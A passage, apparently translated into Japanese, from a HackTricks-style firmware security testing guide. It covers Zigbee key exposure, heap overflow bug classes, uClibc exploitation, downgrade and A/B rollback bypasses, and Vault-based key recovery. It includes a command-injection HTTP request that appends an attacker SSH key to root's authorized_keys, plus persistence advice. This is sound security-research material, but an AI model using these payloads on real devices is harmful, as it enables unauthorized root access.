- **message group**と dispatch table
- ネットワークから送信可能なメッセージと、controller 自体から送信されるメッセージの区別
- 正確な**manufacturer-specific discriminator field**（例: Zigbee の `manufacturer_code` とカスタムの `cluster_command`）
- **commissioning**、discovery、firmware/model download の各フェーズでのみ到達可能な handler

特に Zigbee では、pairing の通信をキャプチャし、対象が既定の**Link Key** `ZigBeeAlliance09` に依然として依存しているか確認します。依存している場合、commissioning 通信の sniffing によって**Network Key**が露出する可能性があります。Zigbee 3.0 の install code はこのリスクを低減するため、テスト対象のデバイスが実際に install code を強制しているか確認してください。

### Manufacturer-specific protocol handler と FSM で制御される到達可能性

Vendor-specific な Zigbee/ZCL command は、標準化された cluster よりも有力なターゲットであることがよくあります。**custom parsing code**や、十分に検証されていない内部**FSM**に処理が渡るためです。<sup>[[8]](#references)</sup>

実践的なワークフロー:

- command dispatcher を解析し、**vendor-only handler**を見つける。
- **FSM state**、**event**、**check**、**action**、**next-state**の table を特定する。
- 自動的に進行する**transitional state**と、最終的に attacker-controlled な state を reset または free する retry/error branch を特定する。
- バグのある handler に常に到達できると決めつけず、脆弱な state に daemon を移行させるために必要な正規の protocol exchange を確認する。

タイミングに敏感な protocol では、Python framework からの packet replay は遅すぎる場合があります。より信頼性の高い方法は、vendor-grade stack を使い、実機ハードウェア（例: **nRF52840**）で正規デバイスをエミュレートして、正しい**endpoint**、**attribute**、commissioning timing を再現することです。

### Embedded daemon における fragmented download のバグクラス

**fragmented blob/model/configuration download**では、次のような firmware のバグが繰り返し見られます:<sup>[[8]](#references)</sup>

1. **最初の fragment**（`offset == 0`）で `ctx->total_size` を保存し、`malloc(total_size)` を実行する。
2. 後続の fragment では、`packet_total_size >= offset + chunk_len` のような attacker-controlled な**packet-local field**だけを検証する。
3. コピー処理では、**最初に割り当てたサイズ**との照合を行わずに `memcpy(&ctx->buffer[offset], chunk, chunk_len)` を実行する。

これにより、攻撃者は次の操作が可能になります。

- **小さな**宣言済み total size を含む最初の正当な fragment を送信し、小さな heap allocation を発生させる。
- **想定された offset**と、より大きな `chunk_len` を含む後続の fragment を送信する。
- 新たな検証を通過しつつ、最初に割り当てられた buffer を overflow させる packet-local size を偽造する。

脆弱な経路が commissioning logic の背後にある場合、malformed fragment を送信する前に、対象を想定された model-download または blob-download state に移行させるための十分な**device emulation**が必要です。

### Protocol-driven `free()` のトリガー

Embedded daemon では、heap metadata の悪用を引き起こす最も簡単な方法は、「cleanup を待つ」ことではなく、**protocol 自身の error handling を強制する**ことです。<sup>[[8]](#references)</sup>

- malformed な後続 fragment を送り、FSM を**retry**または**error** state に移行させる。
- retry threshold を超えさせ、daemon に**context を reset**させて、破損した buffer を free させる。
- この予測可能な `free()` を使って、無関係な理由でプロセスが crash する前に allocator-side primitive を引き起こす。

これは特に、embedded Linux の**musl/uClibc/dlmalloc 系**allocator に有効です。chunk metadata を破損させることで、unlink/unbin logic を write primitive に変えられる可能性があります。安定した手法は、実際の bin pointer をすぐに上書きしてプロセスを crash させるのではなく、**size field**を破損させ、overflow した buffer 内に配置した**fake chunk**へ allocator の探索を誘導することです。

## バイナリExploitとProof-of-Concept

特定した脆弱性の PoC を開発するには、対象アーキテクチャへの深い理解と、低水準言語でのプログラミングが必要です。Embedded system では binary runtime protection はまれですが、存在する場合は Return Oriented Programming（ROP）などの手法が必要になることがあります。

### uClibc fastbin Exploit の注意点（embedded Linux）

- **Fastbin と consolidation:** uClibc は glibc に似た fastbin を使用します。後続の大きな allocation で `__malloc_consolidate()` が実行される場合があるため、fake chunk は検証を通過できなければなりません（妥当な size、`fd = 0`、周囲の chunk が「使用中」と判定されること）。<sup>[[6]](#references)</sup>
- **ASLR 下の non-PIE binary:** ASLR が有効でも、メイン binary が**non-PIE**なら、binary 内の `.data/.bss` address は安定しています。正当な heap chunk header に似た領域を狙うことで、fastbin allocation を**function pointer table**に着地させられます。
- **parser を停止させる NUL:** JSON の parse 時に payload 内の `\x00` があると、その後に attacker-controlled な byte を残したまま parse を停止させ、stack pivot/ROP chain に利用できます。
- **`/proc/self/mem` 経由の shellcode:** `open("/proc/self/mem")`、`lseek()`、`write()`を呼び出す ROP chain を使うと、既知の mapping に実行可能な shellcode を書き込み、そこへ jump できます。

## Firmware Analysis 用の事前構成済み OS

[AttifyOS](https://github.com/adi0x90/attifyos) や [EmbedOS](https://github.com/scriptingxss/EmbedOS) などの OS は、必要な tool を備えた、firmware security testing 用の事前構成済み環境を提供します。

## Firmware 解析用の事前構成済み OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS は、Internet of Things（IoT）デバイスの security assessment と penetration testing を支援するための distro です。必要な tool がすべて読み込まれた事前構成済み環境を提供するため、多くの時間を節約できます。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing tool があらかじめインストールされた、Ubuntu 18.04 ベースの embedded security testing OS です。

## Firmware Downgrade Attack と安全でない Update Mechanism

vendor が firmware image の暗号署名を検証していても、**version rollback（downgrade）保護は省略されていることがよくあります**。bootloader または recovery loader が、組み込みの公開鍵を使って署名を検証するだけで、書き込まれる image の *version*（または単調増加 counter）を比較しない場合、攻撃者は**有効な署名が付いた古い脆弱な firmware**を正規の手順でインストールでき、修正済みの脆弱性を再び持ち込めます。<sup>[[4]](#references)</sup>

一般的な攻撃ワークフロー:

1. **古い署名済み image を入手する**
   * vendor の公開 download portal、CDN、support site から取得する。
   * companion mobile/desktop application（例: Android APK 内の `assets/firmware/`）から抽出する。
   * VirusTotal、Internet archive、forum などの third-party repository から取得する。
2. 公開されているいずれかの update channel を使って、image をデバイスに**upload または配信する**:
   * Web UI、mobile-app API、USB、TFTP、MQTT など。
   * 多くの consumer IoT device は、Base64-encoded firmware blob を受け付け、サーバー側で decode して recovery/upgrade を実行する、*認証不要*の HTTP(S) endpoint を公開しています。
3. downgrade 後、新しい release で修正された脆弱性を悪用する（例: 後の release で追加された command-injection filter）。
4. 必要に応じて、永続化を確保した後に検出を避けるため、最新の image に戻すか update を無効化する。

### 例: Downgrade 後の Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

脆弱な（ダウングレードされた）firmwareでは、`md5`パラメーターがサニタイズされずにシェルコマンドへ直接連結されるため、任意のコマンドを注入できます（ここでは、SSH鍵によるrootアクセスを有効化）。後続のfirmwareバージョンでは基本的な文字フィルターが導入されましたが、ダウングレード保護がないため、この修正は無意味です。<sup>[[4]](#references)</sup>

### モバイルアプリからのFirmware抽出

多くのベンダーは、アプリからBluetooth/Wi-Fi経由でデバイスをアップデートできるよう、コンパニオンモバイルアプリにfirmwareイメージ全体を同梱しています。これらのパッケージは通常、`assets/fw/`や`res/raw/`などのパスにあるAPK/APEX内に暗号化されずに保存されています。`apktool`、`ghidra`、あるいは単純な`unzip`などのツールを使えば、物理ハードウェアに触れることなく、署名済みイメージを取り出せます。<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot設計におけるupdater限定のanti-rollback回避

一部のベンダーはanti-downgrade **ratchet**を実装していますが、*updater*のロジック内にしか実装していません（例: CAN経由のUDSルーチン、recoveryコマンド、userspace OTA agent）。その後、**bootloader**がイメージの署名/CRCのみをチェックし、パーティションテーブルやslotメタデータを信頼する場合、rollback protectionを依然として回避できる可能性があります。<sup>[[7]](#references)</sup>

典型的な脆弱設計:

- Firmwareメタデータに、version descriptorと**security ratchet** / monotonic counterの両方が含まれている。
- Updaterは、イメージのratchetとpersistent storageに保存された値を比較し、古い署名済みイメージを拒否する。
- **Bootloader**はそのratchetを解析せず、選択されたslotを起動する前にheader、CRC、署名だけを検証する。
- Slotの有効化情報はパーティションテーブルまたはslotごとのgeneration counterに別途保存され、検証済みの正確なfirmware digestに**暗号学的に結び付けられていない**。

これにより、dual-slotシステムで**一方のイメージを検証して別のイメージを起動する**プリミティブが生じます。攻撃者が、最新の署名済みイメージを使ってupdaterにslot Bを次回の起動先として設定させ、その後、再起動前にslot Bを上書きできる場合、bootloaderはすでに確定済みのslotメタデータだけを信頼するため、古いイメージを起動する可能性があります。

よくある悪用パターン:

1. **最新の署名済み**firmwareを非アクティブslotにアップロードし、通常の検証/切り替えルーチンを実行して、レイアウト上でそのslotを次のアクティブslotに設定する。
2. **まだ再起動しない**。同じセッションでslot準備/消去ルーチンを再度実行する。
3. 古いboot-stateまたは古いslot選択ロジックを悪用し、直前に昇格させた**同じ物理slot**をupdaterに消去させる。
4. そのslotに、**古いが署名は有効な**firmwareを書き込む。
5. ratchetを適用する検証ルーチンをスキップし、直接再起動する。
6. Bootloaderは昇格済みのslotを選択し、署名/整合性だけを検証して古いイメージを起動する。

A/B update実装をreverse engineeringする際に確認する点:

- Slot選択が、切り替え成功後に更新されない**起動時フラグ**から導出されている。
- `prepare_passive_slot()`のようなルーチンが、**現在確定済みのレイアウト**ではなく古い状態に基づいてslotを消去する。
- `part_write_layout()`のような関数が、検証済みイメージのhashを保存せず、**generation counter** / active flagだけを更新する。
- Ratchetチェックがuserspaceまたはupdaterのコードに実装されているが、ROM / bootloader / secure bootの各段階には**実装されていない**。
- 消去またはrecoveryルーチンが、内容を削除して書き換えた後もslotを起動可能な状態のままにする。

### Update Logicの評価チェックリスト

* *update endpoint*の通信/authenticationは適切に保護されているか（TLS + authentication）？
* Flashingの前に、デバイスは**version number**または**monotonic anti-rollback counter**を比較するか？
* イメージはsecure boot chain内で検証されるか（例: ROM codeが署名をチェックする）？
* **Bootloaderはupdaterと同じratchetを強制するか**。それとも署名/CRCのチェックだけか？
* Slotの有効化メタデータは**検証済みfirmwareのdigest/versionに結び付けられているか**。それとも昇格後にslotを変更できるか？
* Slot切り替えが成功した後、デバイスは強制的に再起動するか。それとも同じセッション中に後続のupdate/eraseルーチンを引き続き実行できるか？
* Userlandのコードは追加のsanity check（例: 許可されたパーティションマップ、model number）を実行するか？
* *partial*または*backup* updateフローは、同じ検証ロジックを再利用しているか？

> 💡  上記のいずれかが欠けている場合、そのプラットフォームはおそらくrollback attackに対して脆弱です。

## 練習用の脆弱なfirmware

Firmwareの脆弱性発見を練習するには、以下の脆弱なfirmwareプロジェクトを出発点として利用してください。

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 組み込みKMS/Vaultの状態からfirmware復号キーを復元する

更新イメージに少量のplaintextメタデータと大きな高エントロピーblobが混在している場合は、何かをbrute-forceする前にコンテナをトリアージしてください。<sup>[[1]](#references)</sup>

- `hexdump`、`xxd`、`strings -tx`、`base64 -d`、`binwalk -E`を使い、header、offset、行境界をダンプする。
- `Salted__`は通常、OpenSSL `enc`形式を意味する。次の8 bytesがsaltで、残りのbytesがciphertext。
- `256` bytesちょうどにdecodeされるBase64フィールドは、ランダムなfirmware password/session keyをラップしたRSA-2048 ciphertextであることを強く示唆する。
- 同じファイル内のdetached PGPデータは、多くの場合authenticityだけを保護する。confidentialityの仕組みだと決めつけないこと。

静的なkey探査（`grep`、`strings`、PEM/PGP検索）で見つからない場合は、private keyを探すだけでなく、**運用上の復号経路**をreverse engineeringしてください。

- Updater / management binaryをdecompileし、暗号化blobを読み込む処理、その復号を行うhelper/API、要求する論理key名を追跡する。
- 抽出したroot filesystem内で、KMSの状態（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`）とunit file、init scriptを検索する。
- plaintextの`vault operator unseal ...`、recovery key、bootstrap token、ローカルKMSのauto-unseal scriptは、private-key materialと同等に扱う。

Applianceに元のVault binaryとstorage backendが含まれている場合、Vaultの内部実装を再現するより、その環境を再現する方が通常は簡単です。

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

クローンした KMS で root 権限を取得した状態で:

- transit key を隔離されたクローン内でのみエクスポート可能にする: `vault write transit/keys/<name>/config exportable=true`
- unwrap key をエクスポートする: `vault read transit/export/encryption-key/<name>`
- 復元した RSA key を、KMS で使用されている正確な padding/hash の組み合わせで試す。PKCS#1 v1.5 decrypt やデフォルトの OAEP decrypt に失敗しても、key が間違っているとは限らない。Vault を使用するフローの多くは SHA-256 の OAEP を使う一方、一般的なライブラリのデフォルトは SHA-1 である。
- payload が `Salted__` で始まる場合は、AES-CBC decrypt を試す前に、ベンダーの OpenSSL KDF（レガシー機器では MD5 を使うことが多い）を正確に再現する（`EVP_BytesToKey`）。

これにより、「暗号化された firmware」は、より一般的な問題になる。**機器側の運用 key を復元し、正確な unwrap + KDF パラメーターをオフラインで再現する**。

## トレーニングと認定資格

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude による firmware の解析: シニアレベルのスキルとジュニアレベルの自律性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware セキュリティテスト手法](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [実践 IoT hacking: Internet of Things を攻撃するための決定版ガイド](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [放棄されたハードウェアの zero-day を悪用する — Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 ドルのスマートデバイスから、あなたの家へのアクセスを得た方法](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [今、mi が見える: 次はあなたが Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - 充電ポートコネクターから Tesla Wall Connector を悪用する - 第 2 部: anti-downgrade の回避](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [点滅させる: Philips Hue Bridge の Over-the-Air Exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU 上で Tesla OS の ROOT を取得する 第 1 部: unpacking](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel ドキュメント - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU 上で Tesla OS の ROOT を取得する 第 2 部: debugging と修正](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS password: 弱い XOR 暗号化により SPI Flash から復元可能 (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS password 復元ツール](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Hardware hacking の復習 第 2 部](https://voidstarsec.com/blog/brushing-up-part-2)
{{#include ../../banners/hacktricks-training.md}}
